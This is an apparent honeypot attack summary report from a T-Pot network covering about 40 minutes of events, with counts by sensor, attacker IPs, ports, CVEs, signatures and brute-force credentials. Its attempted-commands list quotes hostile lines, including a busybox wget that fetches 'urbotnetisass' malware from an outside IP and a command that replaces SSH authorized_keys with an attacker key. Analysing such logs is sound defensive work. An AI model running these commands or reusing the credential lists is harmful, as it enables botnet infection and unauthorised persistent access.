Honeypot Attack Summary Report

Report Generated: 2025-10-15T15:01:46Z
Timeframe: 2025-10-15T14:20:01Z to 2025-10-15T15:00:01Z
Files Included: 
- agg_log_20251015T142001Z.json
- agg_log_20251015T144001Z.json
- agg_log_20251015T150001Z.json

Executive Summary
This report summarizes 24,242 events collected from the T-Pot honeypot network over approximately 40 minutes. The majority of attacks were reconnaissance and brute-force attempts targeting VNC and SIP services. A significant number of probes were also observed against SSH, Telnet, and various other TCP ports. Several CVEs were triggered, and attackers attempted to run various commands, including downloading and executing malware.

Detailed Analysis

Attacks by Honeypot:
- Suricata: 6,059
- Heralding: 5,055
- Sentrypeer: 3,649
- Honeytrap: 3,553
- Cowrie: 3,108
- Ciscoasa: 1,662
- Mailoney: 866
- H0neytr4p: 118
- Tanner: 72
- Dionaea: 61
- Dicompot: 16
- Honeyaml: 10
- Redishoneypot: 6
- Ipphoney: 4
- Adbhoney: 3

Top Attacking IPs:
- 45.134.26.47: 5,043
- 10.208.0.3: 2,570
- 10.140.0.3: 2,482
- 185.243.5.121: 1,792
- 206.191.154.180: 1,369
- 38.244.38.63: 1,242
- 172.86.95.98: 471
- 172.86.95.115: 469
- 62.141.43.183: 322
- 23.94.26.58: 329

Top Targeted Ports/Protocols:
- vnc/5900: 5,041
- 5060: 3,649
- 22: 514
- 5903: 212
- 1512: 117
- 8333: 157
- 443: 118
- UDP/5060: 96
- 5901: 102
- 5908: 84
- 5909: 83

Most Common CVEs:
- CVE-2021-3449
- CVE-2019-11500
- CVE-2018-10562, CVE-2018-10561
- CVE-2013-7471
- CVE-2002-1149

Commands Attempted by Attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys
- cat /proc/cpuinfo | grep name | wc -l
- uname -a
- whoami
- w
- crontab -l
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...

Signatures Triggered:
- ET INFO VNC Authentication Failure
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- GPL INFO SOCKS Proxy attempt
- ET INFO Reserved Internal IP Traffic
- ET VOIP Modified Sipvicious Asterisk PBX User-Agent
- ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper

Users / Login Attempts (user/pass):
- default/12345
- centos/4444
- config/config2007
- test/8888
- operator/operator2010
- guest/88
- root/beNbKpXbpb3Y8m4
- 345gs5662d34/345gs5662d34
- unknown/unknown2011

Files Uploaded/Downloaded:
- nse.html)
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3

HTTP User-Agents:
- N/A

SSH Clients:
- N/A

SSH Servers:
- N/A

Top Attacker AS Organizations:
- N/A

Key Observations and Anomalies:
- A large number of attacks are coming from the IP address 45.134.26.47, primarily targeting VNC services.
- Internal IP addresses (10.x.x.x) are listed as top attackers, which may indicate internal network scanning or misconfiguration.
- Attackers attempted to download and execute multiple versions of the 'urbotnetisass' malware, targeting different architectures (ARM, x86, MIPS).
- Several commands are focused on manipulating SSH keys and disabling file system protections.
